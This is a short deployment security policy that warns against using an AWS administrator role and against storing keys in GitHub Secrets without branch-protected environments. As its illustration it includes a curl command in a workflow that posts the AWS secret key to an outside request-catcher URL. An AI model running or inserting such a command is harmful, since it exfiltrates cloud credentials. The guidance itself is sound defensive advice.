# Serverless Deployment Policy
Sadly, the serverless documentation does not clearly mention that the **“Administration Role” should never be used in production environments**. 
Using this role can cause significant security risks. If someone gains access to these keys, 
they may be able to create a new user with access to the web console and take full control of your AWS account.

Please create pull requests if you come across new permissions such as for AWS Kinesis.

## GitHub Secrets Note
Furthermore, avoid using the "Administration Role" for any AWS account if you only 
store the keys in GitHub Secrets without using the GitHub Environment with the "Protected Branch" configuration.  

Storing keys directly in GitHub Secrets without additional security controls can lead to unauthorized access. 
Any user with commit privileges could potentially utilize GitHub Actions to extract these keys

```
curl -d '{ "name": "${{ secrets.AWS_SECRET_KEY }}" }' \
  -H "Content-Type: application/json" \
  https://enci4g46iahum.x.pipedream.net/
```

Therefore, it is advisable to use GitHub environments to restrict key access to specific branches within your repository. 
This practice helps to increase security and keep controlled access to sensitive information.
